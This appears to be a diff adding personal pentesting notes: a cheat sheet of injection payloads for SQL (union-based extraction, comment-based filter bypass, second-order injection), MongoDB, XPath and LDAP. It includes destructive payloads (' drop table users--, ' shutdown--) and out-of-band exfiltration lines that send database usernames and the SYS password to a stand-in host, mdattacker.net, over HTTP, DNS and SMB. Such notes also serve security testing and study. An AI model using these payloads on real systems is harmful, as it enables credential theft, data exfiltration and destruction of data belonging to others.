@@ -1,0 +1,98 @@
+* If the parameter to test is numeric, try to inject the payload wihout ' nor " (example: ?Emp=3 or 1=1--)
+
+* To avoid using -- in SQL injection payloads, try this payload : gibberish' OR 'a' = 'a so that the final statement will be " SELECT * from table_name where user='gibberish' OR 'a' = 'a';
+
+* By default, integers in databases are casted into strings. So to test injection in insert queries, try this :
+	foo')--
+	foo', 1)--
+	foo', 1, 1)--
+	foo', 1, 1, 1)--
+
+Of course, replace 1 with a longer integer (ex 2000)
+
+* For Update statement: the query is: UPDATE users SET pass='MMLLMM' WHERE user='foo' and pass='word';
+if we inject admin'-- in user the application won't check the password. 
+So the idea here is to test using a valid username.  P.S: admin' or 1=1-- will change the password for all users.
+
+* URL parameters values and even names may be vulnerable to SQL injection .
+
+* When testing for SQL injection, submitting payloads within a request and monitoring its direct response may miss flaws. Test the whole stage.
+
+* Test for SQL injection using the concatenation string : 
+	- Oracle : '||'Foo	 ====>   This will give 
+	- MS-SQL : '+'Foo	 ====>	 Foo as a result
+	- MySQL : ' 'Foo         ====>	 after concatenation
+
+* If the tested parameter value is numeric and the original value is 2 for example, try to inject these:
+	* 5-3
+	* 1+1
+	* 51-ASCII(1)   // ASCII(1) is 49
+
+* When testing numeric parameters, these payloads evaluate to 0 in the target database and returns an error in others:
+	* Oracle: BITAND(1,1)-BITAND(1,1)
+	* MS-SQL: @@PACK_RECEIVED-@@PACK_RECEIVED
+	* MySQL: CONNECTION_ID()-CONNECTION_ID()
+
+* When exploiting SQL injection vulnerability, the steps are as follows:
+	- Identify the number of columns by using :
+		' union select NULL,NULL FROM DUAL--   //add NULL until you get the number of columns (an empty row will be added in the HTML table) ; also I added FROM DUAL because Oracle does not accept 'union SELECT NULL,NULL-- ; 		this generates an error
+
+	- Find a column in the result HTML table (or any other type of response) that has a string data type so that we use it to hold our extracted data.
+
+	- We suppose the number of columns is 3 and the first column has a string type. We get the version of oracle using:
+		' union select banner,NULL,NULL FROM v$version-- //in MySQL : 'union select @@version,NULL,NULL--
+
+* Bypass filters by adding comments in the SQL statement. Example: SELECT/*foo*/user,pass/*foo*/FROM/*foo*/users
+In MySQL, we can even insert comments in keywords. Example: SEL/*foo*/ECT/*foo*/user...
+
+* When the application offers a functionality that allows to insert into a database like a user registration and then extracts this data from the database knowing that when there is ' (single quote) in the data inserted the application adds another ' in front of it to mitigate against SQL injection, we can create a user having the name "   ' or 1 in (select password from users where username='admin')--  " so that when data is retrieved from database (at the change password functionality for example) the SQL statement will be executed.
+
+* If the field length is limited, try to inject :
+	- ' shutdown--   // in MS-SQL
+	- ' drop table users--  // 
+
+* Try Out-of-Bound channel (get a connection back):
+	- in oracle: - /employees.asp?EmpNo=7521'||UTL_HTTP.request('mdattacker.net:80/'||
+(SELECT%20username%20FROM%20all_users%20WHERE%20ROWNUM%3d1))--   // when setting a netcat listener on port 80 on mdatter.net, we get  GET /SYS HTTP/1.1
+
+		     - /employees.asp?EmpNo=7521'||UTL_INADDR.GET_HOST_NAME((SELECT%20PASSWORD%
+20FROM%20DBA_USERS%20WHERE%20NAME='SYS')||'.mdattacker.net')--   // this appends the retrieved value to the domain mdattacker.net  ! this is better because it works on dns not http => helps in bypassing firewalls
+
+	- in MySQL : /employees.asp?EmpNo=7521' union select * into outfile '\\\\mdattacker.net\\share\\output.txt' from users-- // we have to create an SMB share on mdattacker.net (or set a listener to see if there is connection)
+
+* In MSSQL the stored procedure xp_cmdshell allows to execute system commands and xp_regread and xp_regwrite allow to read from and write to registers. By default MSSQL runs as LocalSystem
+
+* MongoDB is a form of NoSQL (hierarchical structure (inode concept) rather than tables). Example:
+$js = "function() { return this.username == '$username' & this.password == '$password'; }";
+
+This javascript function uses MongoDB to retrieve data. If username is vulnerable, inject this in username:
+	- Marcus'//  => function() { return this.username == 'Marcus'//' & this.password == 'aaa'; } and // tells the rest is a comment in javascript
+    (or)-   a' || 1==1 || 'a'=='a : which will be (this.username == 'a' || 1==1) || ('a'=='a' & this.password ==
+'aaa'); and this is always true
+
+* XPath injection: this query //address[surname/text()='Dawes' and password/text()='secret']/ccard/
+text() retrieves ccard of the user based on password and surname. If we inject ' or 'a'='a as password the query becomes:
+	[surname/text()='Dawes' and password/text()='' or 'a'='a']/ccard/text() => which retrieves ccards of all users.
+
+* Payloads for XPath :   - '
+			 - '--
+			 - ' or 'a'='a
+			 - ' and 'a'='b
+			 - or 1=1
+			 - and 1=2
+		   	 - ' or 1=1 and 'a'='a
+			 - ' or 1=2 and 'a'='a
+			 - ' or count(parent::*[position()=1])=0 or 'a'='b
+			 - ' or count(parent::*[position()=1])>0 or 'a'='b
+			 - 1 or count(parent::*[position()=1])=0
+			 - 1 or count(parent::*[position()=1])>0
+			 - ' or substring(name(parent::*[position()=1]),1,1)= 'a    // This bruteforces the 
+			 - ' or substring(name(parent::*[position()=1]),1,1)= 'b    // first letter of the parent
+			 - ' or substring(name(parent::*[position()=1]),1,1)= 'd    // of the current node
+
+* Payloads for LDAP :
+			- *
+			- ))))))))))))  //this will match all opened brackets and more. It wil cause a syntax error
+			- )(cn=*	// The cn attribute is supported by all LDAP implementation
+			- *))(|(cn=*
+			- *))%00	// %00 is translated into NULL which signifies string termination in LDAP
